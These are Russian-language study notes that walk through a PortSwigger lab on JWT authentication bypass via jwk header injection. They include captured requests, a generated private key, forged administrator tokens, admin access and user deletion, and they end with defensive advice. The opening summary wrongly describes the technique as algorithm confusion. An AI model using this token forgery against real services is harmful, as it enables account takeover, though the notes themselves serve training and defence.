
## короче говоря - суть атаки - это найти паблик кей, потом поменять алгос на симметричный и изменить jwt - в конце переподписать jwt ключом публичным

-----

#### способ 5: Инъекция через `jwk` 
взято из: [[0_jwt_theory]]

Вставляешь в заголовок `jwk` со своим публичным ключом, подписываешь токен своим приватным 
Сервер доверяет ключу из токена - подпись проходит

**JWK** - это параметр заголовка, который позволяет **встроить публичный ключ прямо в токен**
**JWK** - Предоставляет встроенный JSON-объект, представляющий ключ

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "t-n4esxqCC4bQR68A14Rxc5nwFl2YS74hqjWSTM3T8Rz6pTxT76CpOI1VnqTLF-aVS1lgtKcWGr247MIAB927IXUUYZNGw7bRmY8eDvBaewR-_IDTPxAdKT9cfwydswMi934eTGRv9i5DPZEJyK6QZs91Ou6V5xWAdjAn0ZjOnifb9yYLvhq3yEX6oRonf-o651kJAkvuUgszjPYpBD4pi0s_o6HZJqmSg8Hfi0sOcabW25Ukiah2mlGlyKfHG_0xuL-EGo9npM58b9V25Q4x3cC3vVRHestJcnPvyvFFJcAQtmMqw92JVQ_Mh3QSdR93E1h3_otyyb2YIuX9clu4Q",
    "e": "AQAB"
  }
}
```

Как ломают: Ты генеришь свою пару RSA-ключей, вставляешь публичный ключ в `jwk`, подписываешь токен своим приватным ключом. 
Сервер, который доверяет ключам из токена, примет твою подпись

---------

--------

>	короче говоря - суть - это найти паблик кей, потом поменять алгос на симметричный 
>	и изменить jwt - в конце переподписать jwt ключом публичным

-----

## решаю лабу:
#### обход аутентификации JWT с помощью ввода заголовка jwk
лаба:  https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection

Сервер поддерживает `jwk` параметр в заголовке JWT
задача - переподписать jwt 
изменить jwt
получить доступ к админке по /admin
удалить карлоса

----

залогинился под профилем wiener

вот запрос на мою страницу

```http
GET /my-account?id=wiener HTTP/2
Host: 0a2e000c0469d0298096e0ee00d7002c.web-security-academy.net
Cookie: session=eyJraWQiOiIzYWFmNjg4OS0yYzU4LTQ3NDItYTRhNy1jMGIxOGI0OWNkOTUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUzMzQ2NCwic3ViIjoid2llbmVyIn0.sFgCxDzr1dgCAVa-qAPynxpD8kfqENCUJ4h0UIf2tcWowyUWCRkdFkttNjJ-5S6ZWVPo71uDvz_7tChJp82kYQsSRpl4BGc40cHdBZuLnxow_bCONANFTLrdnjjIuCnswgjfgrRtpCvtqOlfZZNWt52fgk8Av2pJqpCmRF6aT6Q4ieXFbsJ9_kAGsjXtjKALfaaBC8AF_0KLwfjHH7KOyYjtdTSM3eqnOFKVu5E8AllPSudtV-0D2d8TKjxKaWHVuvd4Bm7lVLJbj-Qx23-Q6XhNMgYwlt12td5qRE1CMUCSAU-WU_S2K8u1OKE_89PiXxVOorCo8ftxnj4gs29lxQ
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a2e000c0469d0298096e0ee00d7002c.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

исследую токен

```json
{"kid":"3aaf6889-2c58-4742-a4a7-c0b18b49cd95","alg":"RS256"} // хедер
.
{"iss":"portswigger","exp":1772533464,"sub":"wiener"}   // пейлоад

```

RS256   - Асимметричное шифрование

подпись длинная 
```
eyJraWQiOiIzYWFmNjg4OS0yYzU4LTQ3NDItYTRhNy1jMGIxOGI0OWNkOTUiLCJhbGciOiJSUzI1NiJ9.

eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUzMzQ2NCwic3ViIjoid2llbmVyIn0.

sFgCxDzr1dgCAVa-qAPynxpD8kfqENCUJ4h0UIf2tcWowyUWCRkdFkttNjJ-5S6ZWVPo71uDvz_7tChJp82kYQsSRpl4BGc40cHdBZuLnxow_bCONANFTLrdnjjIuCnswgjfgrRtpCvtqOlfZZNWt52fgk8Av2pJqpCmRF6aT6Q4ieXFbsJ9_kAGsjXtjKALfaaBC8AF_0KLwfjHH7KOyYjtdTSM3eqnOFKVu5E8AllPSudtV-0D2d8TKjxKaWHVuvd4Bm7lVLJbj-Qx23-Q6XhNMgYwlt12td5qRE1CMUCSAU-WU_S2K8u1OKE_89PiXxVOorCo8ftxnj4gs29lxQ
```

бутфорсить бессмысленно!

-------


возможные векторы атаки :
1) RS256 изменить на симметричный
2) либо проверить может вообще подпись не проверяется

-----
подпись проверяется - ответ 401 Unauthorized

---


пробую найти публичный ключ чтобы поменять RS256  на симметричный HS256


тыкаю весь сайт, ищу подсказки:

```
/resources/images/avatarDefault.svg
/image/blog/posts/29.jpg
/resources/css/labsBlog.css
/resources/labheader/css/academyLabHeader.css
/?search=7777
/my-account?id=wiener
```

ничего не нашел

----

GET /jwks.json HTTP/2     - 404
/.well-known/jwks.json  - 404
/jwks.json   - 404
/certs -404

----

значит можно пробовать тупо добавить свой Jwk ключ 

вот оригинал
```json
{"kid":"3aaf6889-2c58-4742-a4a7-c0b18b49cd95","alg":"RS256"} // хедер
.
{"iss":"portswigger","exp":1772533464,"sub":"wiener"}   // пейлоад

```

для начала нужно сделать свой RSA ключ:
едем в бурп - в плагин JWT editor
новый RSA ключ
и вот у меня уже есть набор клчюей

<img src="../../assets/564rfrd42026-03-015.05.23.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



```json
{  
    "p": "xjtfSmVzw0dI1rCr2-LzJXQXaYs5B4BwznQv7JSfLybG-0S31K9d9wtMreWuLPnEV7NSjPG18d-rNzjEMJkl4Ok3cxyVEqeWem0YpNysh83sr78v4GgC0H3aozhUa2XYFlTHMOWBusamDifvAg72z2GMbmAODXGuW3pNa3hHbUM",  
    "kty": "RSA",  
    "q": "th_5WOIlh7t0razvcVgh2J6qlEIh8_3hOTOqI2Pa_La2D_H76ByDcqw9AvLjQoj4f8Zc9l7R8_QXkZh7Svsd6crKjaHKhmgA5lPc4ueU14kbuCVYNBaaK7KJqD1RgTxCG2U9wvxnq1ONohDrCvv3RXW4J6hHeYyqYRKKZTIvyvc",  
    "d": "CJ0rWvtGCo_TTNZiP5wHZEJzjGN6bJWrSwtSh0EPr9XL6uK4OgSSx0M9iQqU34WIVbe_VZrUrrJV36fgxr6e6qv1Um6yCoAFZr9kQ-DQnhifFuZrEuxuvY7HYG5URa2MeEFnLQj1PM3KVpp7uFWwwib2dPNJf1SvPNe6uULciaLDaFrHCouwbvU20r8vh2jMw11ntT_08VytLACRjjlhF_dcGLFI1QAFS90IbVvTPmZi6Mgp-NXuOeO3fXNnGvzWvO0HUTUB0J-GPzBmdAqp4lkzVTbe7qIh1oRQr4SsfqyU5wrQzrB4MIwLh3ojIR7wlG6oBpIp3t8Kz6Y9NJBrxQ",  
    "e": "AQAB",  
    "kid": "614a9aa9-031e-4748-8968-6d6ef537fdd1",  
    "qi": "Ay8k2oKakN85OayaryHdf_oMf68goC4wl6CL8O7Y6HonKQ7ms4ZtQ6iX0sshdiCV_cuCHbZLYf7hJoV56sLqMsEwkT8qEToIrTD8QdY_nnCj4RByopVmtt8xEubddlNQwwQZqbGvFidsFGHyQKIyaX13CU3tmBJT0NYbS8Un680",  
    "dp": "bJsm0BnZXMn3bDiLUAN9d62tDhRLAIMsStB5WULsG-dA6XVyykHyV2GHd1b5IIcPPYVv2uyq5IPIyI5_Xqjpidn8mUK1oezTkuumrtyAYj8-R-OVlXsm35e0a-x2xAieZU25fF6hvvULEYJrflM4gdJOIELcMB1yi4fsVs8lQwU",  
    "dq": "ZfUWcXUBD7CYzFXBIlH1eMCyvBcdzOs3N_-9YtyXDtz2pYyRusqjqAHWkh0JrwjhHR8ekepZXVosC50ygLJ-d5DIvmtx5ra4sjkGspx0zgj61KdLbrWsj4P-3omdZF0ooQ-XeN4250n6Q113SAnwzxjtBH6HrPtbssZfZfGnodc",  
    "n": "jQb4BAFYLei2bwAiJmOSydKU7x5NIVMxm8M33fOGjGfXoD2Xzisnk2kfzVuCiF8mxVx6XN5xjHCXkNXiHDpuNUOYznAzv-yNYhbU6eCx-QtlNJnd73gEOF_84Thi_4p3Ma6-muaAJQeu7xrxyn-XG80iFLQ-1yVyw3_P-K7U_fqEjNthjsKazN7CE628zRsD1ujQoUVhAXYya0XLFL1nvxOG5nd22eBon1Iy8w91qhvELC4vqlAzEdrKbUi6NpJOr2Nq2uqx6iMa1foMTbIdeFt1ioAIDmGq8o9Y8Vq3tAOHNNpqOd0MYPKnbho7zuIqzNvcpm-FJCL_GsF8jm5JpQ"  
}
```

чтобы добавить ключ JWK в хедер нужно  добавить это
```json
{
  "kty": "",
  "e": "",
  "kid": "",
  "n": ""
  }
```

```json
оригинал

{"kid":"3aaf6889-2c58-4742-a4a7-c0b18b49cd95","alg":"RS256"} // хедер

меняю

{
  "kid": "3aaf6889-2c58-4742-a4a7-c0b18b49cd95",
  "alg": "RS256",
  "jwk": {
    "kty": "",
    "e": "",
    "kid": "",
    "n": ""
  }
} // хедер

```

все данные для подстановки уже сгенерировал - нужно только подставить:

```json
оригинал

{"kid":"3aaf6889-2c58-4742-a4a7-c0b18b49cd95","alg":"RS256"} // хедер

меняю и заполняю

{
  "kid": "3aaf6889-2c58-4742-a4a7-c0b18b49cd95",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "614a9aa9-031e-4748-8968-6d6ef537fdd1",
    "n": "jQb4BAFYLei2bwAiJmOSydKU7x5NIVMxm8M33fOGjGfXoD2Xzisnk2kfzVuCiF8mxVx6XN5xjHCXkNXiHDpuNUOYznAzv-yNYhbU6eCx-QtlNJnd73gEOF_84Thi_4p3Ma6-muaAJQeu7xrxyn-XG80iFLQ-1yVyw3_P-K7U_fqEjNthjsKazN7CE628zRsD1ujQoUVhAXYya0XLFL1nvxOG5nd22eBon1Iy8w91qhvELC4vqlAzEdrKbUi6NpJOr2Nq2uqx6iMa1foMTbIdeFt1ioAIDmGq8o9Y8Vq3tAOHNNpqOd0MYPKnbho7zuIqzNvcpm-FJCL_GsF8jm5JpQ"
  }
} // хедер


пейлоад оригинал

{"iss":"portswigger","exp":1772533464,"sub":"wiener"}   // пейлоад

меняю на

{"iss":"portswigger","exp":1772533464,"sub":"administrator"}   // пейлоад

```


----

 ```
 теперь нужно сделать подпись моим новым полученным выше  ключом 
 
 "n": "jQb4BAFYLei2bwAiJmOSydKU7x5NIVMxm8M33fOGjGfXoD2Xzisnk2kfzVuCiF8mxVx6XN5xjHCXkNXiHDpuNUOYznAzv-yNYhbU6eCx-QtlNJnd73gEOF_84Thi_4p3Ma6-muaAJQeu7xrxyn-XG80iFLQ-1yVyw3_P-K7U_fqEjNthjsKazN7CE628zRsD1ujQoUVhAXYya0XLFL1nvxOG5nd22eBon1Iy8w91qhvELC4vqlAzEdrKbUi6NpJOr2Nq2uqx6iMa1foMTbIdeFt1ioAIDmGq8o9Y8Vq3tAOHNNpqOd0MYPKnbho7zuIqzNvcpm-FJCL_GsF8jm5JpQ" 
 ```

подставляю новые хедер и пейлоад в jwt 

получаю (собираю jwt) со старой подписью ....gs29lxQ
```json
eyJraWQiOiIzYWFmNjg4OS0yYzU4LTQ3NDItYTRhNy1jMGIxOGI0OWNkOTUiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjYxNGE5YWE5LTAzMWUtNDc0OC04OTY4LTZkNmVmNTM3ZmRkMSIsIm4iOiJqUWI0QkFGWUxlaTJid0FpSm1PU3lkS1U3eDVOSVZNeG04TTMzZk9HakdmWG9EMlh6aXNuazJrZnpWdUNpRjhteFZ4NlhONXhqSENYa05YaUhEcHVOVU9Zem5BenYteU5ZaGJVNmVDeC1RdGxOSm5kNzNnRU9GXzg0VGhpXzRwM01hNi1tdWFBSlFldTd4cnh5bi1YRzgwaUZMUS0xeVZ5dzNfUC1LN1VfZnFFak50aGpzS2F6TjdDRTYyOHpSc0QxdWpRb1VWaEFYWXlhMFhMRkwxbnZ4T0c1bmQyMmVCb24xSXk4dzkxcWh2RUxDNHZxbEF6RWRyS2JVaTZOcEpPcjJOcTJ1cXg2aU1hMWZvTVRiSWRlRnQxaW9BSURtR3E4bzlZOFZxM3RBT0hOTnBxT2QwTVlQS25iaG83enVJcXpOdmNwbS1GSkNMX0dzRjhqbTVKcFEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUzMzQ2NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.sFgCxDzr1dgCAVa-qAPynxpD8kfqENCUJ4h0UIf2tcWowyUWCRkdFkttNjJ-5S6ZWVPo71uDvz_7tChJp82kYQsSRpl4BGc40cHdBZuLnxow_bCONANFTLrdnjjIuCnswgjfgrRtpCvtqOlfZZNWt52fgk8Av2pJqpCmRF6aT6Q4ieXFbsJ9_kAGsjXtjKALfaaBC8AF_0KLwfjHH7KOyYjtdTSM3eqnOFKVu5E8AllPSudtV-0D2d8TKjxKaWHVuvd4Bm7lVLJbj-Qx23-Q6XhNMgYwlt12td5qRE1CMUCSAU-WU_S2K8u1OKE_89PiXxVOorCo8ftxnj4gs29lxQ


```

подпись сделать можно вот тут https://www.jwt.io
или в самом burp в репитере в jwt web token - кнопка снизу - sign

обязательно выбираю апгрейд параметров (так как первый раз я не менял там ничего и тупил 20 мин - почему не работает нчиего) а нужно было просто подставить полученные параметры

<img src="../../assets/65457772026-03-015.19.03325.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



нажимаю - и получаю новую подпись!

```
bNe9r8YF2SDXwxTgmz95LNfJM2KX86yPdS6VjMkVZz003vu7BRYWju6w42bcGv73zBDZ6YVaGgkklPatAS2yj9VXKD2u1dWQgTe57nE9H-4BZcsXX-uiO0sX_NaUvmpiBoBPrdw9zDEoBk5xa8mEo6GOHRxyW5paHXUSzqXuasQ18_9ih6zx91wmIUsf8v9kbjhYUSuCPjGglcyHxkTdMMJbsyOynAjPVoY8ftiC-8BerSuSt4gfW6f6k1ciWXtTdkNMeYv7NFsA5p78ZpS-W-wkGC7YEhARCgJHigFYgj1BTHMHHaNk0JXlCfcTNjm07RJBjNSfIHZ9clUhHlmdGQ
```

и вот полностью готовый JWT переподписанный

```json
eyJraWQiOiIzYWFmNjg4OS0yYzU4LTQ3NDItYTRhNy1jMGIxOGI0OWNkOTUiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjYxNGE5YWE5LTAzMWUtNDc0OC04OTY4LTZkNmVmNTM3ZmRkMSIsIm4iOiJqUWI0QkFGWUxlaTJid0FpSm1PU3lkS1U3eDVOSVZNeG04TTMzZk9HakdmWG9EMlh6aXNuazJrZnpWdUNpRjhteFZ4NlhONXhqSENYa05YaUhEcHVOVU9Zem5BenYteU5ZaGJVNmVDeC1RdGxOSm5kNzNnRU9GXzg0VGhpXzRwM01hNi1tdWFBSlFldTd4cnh5bi1YRzgwaUZMUS0xeVZ5dzNfUC1LN1VfZnFFak50aGpzS2F6TjdDRTYyOHpSc0QxdWpRb1VWaEFYWXlhMFhMRkwxbnZ4T0c1bmQyMmVCb24xSXk4dzkxcWh2RUxDNHZxbEF6RWRyS2JVaTZOcEpPcjJOcTJ1cXg2aU1hMWZvTVRiSWRlRnQxaW9BSURtR3E4bzlZOFZxM3RBT0hOTnBxT2QwTVlQS25iaG83enVJcXpOdmNwbS1GSkNMX0dzRjhqbTVKcFEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUzMzQ2NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.bNe9r8YF2SDXwxTgmz95LNfJM2KX86yPdS6VjMkVZz003vu7BRYWju6w42bcGv73zBDZ6YVaGgkklPatAS2yj9VXKD2u1dWQgTe57nE9H-4BZcsXX-uiO0sX_NaUvmpiBoBPrdw9zDEoBk5xa8mEo6GOHRxyW5paHXUSzqXuasQ18_9ih6zx91wmIUsf8v9kbjhYUSuCPjGglcyHxkTdMMJbsyOynAjPVoY8ftiC-8BerSuSt4gfW6f6k1ciWXtTdkNMeYv7NFsA5p78ZpS-W-wkGC7YEhARCgJHigFYgj1BTHMHHaNk0JXlCfcTNjm07RJBjNSfIHZ9clUhHlmdGQ
```

пробую сперва на своем аккаунте - ответ 302 !! отлинчо - значит токен работает!!

перехожу в админку 
```http
GET /admin HTTP/2
Host: 0a2e000c0469d0298096e0ee00d7002c.web-security-academy.net
Cookie: session=eyJraWQiOiI2MTRhOWFhOS0wMzFlLTQ3NDgtODk2OC02ZDZlZjUzN2ZkZDEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjYxNGE5YWE5LTAzMWUtNDc0OC04OTY4LTZkNmVmNTM3ZmRkMSIsIm4iOiJqUWI0QkFGWUxlaTJid0FpSm1PU3lkS1U3eDVOSVZNeG04TTMzZk9HakdmWG9EMlh6aXNuazJrZnpWdUNpRjhteFZ4NlhONXhqSENYa05YaUhEcHVOVU9Zem5BenYteU5ZaGJVNmVDeC1RdGxOSm5kNzNnRU9GXzg0VGhpXzRwM01hNi1tdWFBSlFldTd4cnh5bi1YRzgwaUZMUS0xeVZ5dzNfUC1LN1VfZnFFak50aGpzS2F6TjdDRTYyOHpSc0QxdWpRb1VWaEFYWXlhMFhMRkwxbnZ4T0c1bmQyMmVCb24xSXk4dzkxcWh2RUxDNHZxbEF6RWRyS2JVaTZOcEpPcjJOcTJ1cXg2aU1hMWZvTVRiSWRlRnQxaW9BSURtR3E4bzlZOFZxM3RBT0hOTnBxT2QwTVlQS25iaG83enVJcXpOdmNwbS1GSkNMX0dzRjhqbTVKcFEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUzNzUwNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.XGLoFUGhwnClwtQUroyDztKu4QcjRqwMt8AczZBjAaL7bpN5JiuWxSZeL98Se_ERxG7pr2esdsMZ25fEUD9VRlVoqgB42YKm2Xx3Sqv77ufB6tESFgeNw1EOCdapduL00Iij3522mYkU3sKK2li57iGqg1BqMegjMCUEXxEE_esnhQkJy7TDjlzbBeuY8c8pfNICjMFoQyaP0k-fPJHydi5pvXpu_h66STt-U8OCtSncfXoqqYtNDV6w3siXl6n3fqtmvzqUWtdxMNIUHn4AI3Um1bjNEzE-h2Dac8qJfqrp0AkosQuMTan1wEjIeoRqZ_pupzJYMkdSL--wz5I3tA
Cache-Control: max-age=0
Accept-Language: ru-RU,r
```

```
ответ:  200 OK по

отлично!!!

```

есть пути для делити юзеров

```html
                           <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
```

## юзеры удалены - лаба решена! 

#### итоги / выводы / защита 


**Уязвимость**: Сервер поддерживает параметр `jwk` в заголовке JWT и **доверяет любому ключу, который в нем передан** . Это нарушение принципа доверия — ключ должен браться из доверенного источника, а не от клиента

ЧТО Я СДЕЛАЛ

-
    Сгенерировал свою пару RSA-ключей (публичный + приватный)
    
- Встроил **публичный ключ** в хедер токена через параметр `jwk`
    
- Изменил payload (подменил `wiener` на `administrator`)
    
- Переподписал токен своим **приватным ключом**
    
- Сервер увидел ключ в `jwk`, проверил им подпись (сошлось!) и пустил в админку

 Сервер не проверяет происхождение ключа. Ему плевать — свой ключ или чужой, лишь бы подпись совпала

------

## ЗАЩИТА

 **запретить параметр `jwk`** — отключить поддержку встроенных ключей нафиг. Если не используется — выпилить
   
 **белый список доверенных ключей** — даже если `jwk` приходит, проверять, что ключ из доверенного источника
   
 **не использовать `jwk` вообще** — ключи должны храниться на сервере, а не прилетать от клиента
   
 **валидировать `kid`** — если используется, то только из списка доверенных, без path traversal и SQLi
   
**фиксированный алгоритм** — не брать `alg` из токена, а задавать жёстко на сервере

### для пентеста

 **проверять поддержку `jwk`** — если сервер его понимает, это почти всегда критическая дыра
   
 **не путать с algorithm confusion** — здесь `alg` **не меняется** на HS256. Остаётся RS256
   
 **следить за подписью** — после изменения хедера и payload обязательно переподписывать
   
 **проверять ответ** — 302 после подмены на своём аккаунте означает, что токен валиден


